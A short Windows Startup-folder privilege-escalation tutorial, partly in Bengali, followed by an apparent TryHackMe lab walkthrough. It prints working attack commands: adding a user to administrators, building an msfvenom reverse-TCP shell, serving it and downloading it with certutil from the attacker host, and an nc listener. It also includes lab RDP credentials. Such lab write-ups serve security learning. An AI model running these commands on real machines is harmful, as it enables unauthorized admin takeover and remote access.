##  🪟 Windows Startup Folder Privilege Escalation

**Startup Folder** হলো Windows-এর একটি বিশেষ ফোল্ডার, যেখানে রাখা যেকোনো প্রোগ্রাম বা স্ক্রিপ্ট ইউজার লগইন করার সাথে সাথে স্বয়ংক্রিয়ভাবে রান হয়।

### ⚠️ Privilege Escalation কীভাবে হয়?
যদি কোনো **low privilege user** এই Startup folder-এ **write permission** পায়, এবং এই ফোল্ডারটি কোনো **Administrator user** দ্বারা ব্যবহৃত হয়, তাহলে attacker সেখানে একটি malicious file রাখতে পারে।

👉 পরে যখন Admin লগইন করবে, সেই malicious file রান হবে  
👉 এবং attacker **Admin privilege** পেয়ে যাবে  

---

### 🛠️ সংক্ষেপে ধাপ:
1. Startup folder-এর permission চেক করা  
2. যদি write access থাকে → vulnerability  
3. malicious script (.bat/.exe) তৈরি করা  
4. Startup folder-এ রেখে দেওয়া  
5. Admin লগইনের অপেক্ষা  
6. Admin privilege পাওয়া  

---

### 💡 উদাহরণ:
```bat
net localgroup administrators attacker /add
```

### 👉 এই কমান্ড রান হলে attacker admin group-এ যুক্ত হয়ে যাবে


🔐 প্রতিরোধ:
* Startup folder-এ write permission সীমিত করা
* Proper ACL (Access Control) ব্যবহার করা
* Suspicious file monitor করা


## Solve the THM room

### **Run The windows machine**

```
xfreerdp3 /u:user /p:password321 /cert:ignore /v:10.49.176.234 /smart-sizing

```

### **Go to startup folder**
```
cd "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

dir
```

### **Check the file write permission**
```
echo > test.txt 
```
##### if the file test.txt is created then the folder have write permission for your user

### **Now make a reverse shell of my kali linux machine**
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe

python3 -m http.server 80

nc -nlvp 4444
```

### **Download / Add the malicious shell.exe fo the Startup folder**
```
certutil -urlcache -split -f http://kali_ip shell.exe shell.exe
```
#### Now it add the shell.exe file to the windows startup folder. When a user(administrator) login then the shell.exe if automatically run and give the reverse connection to the kali shell ..
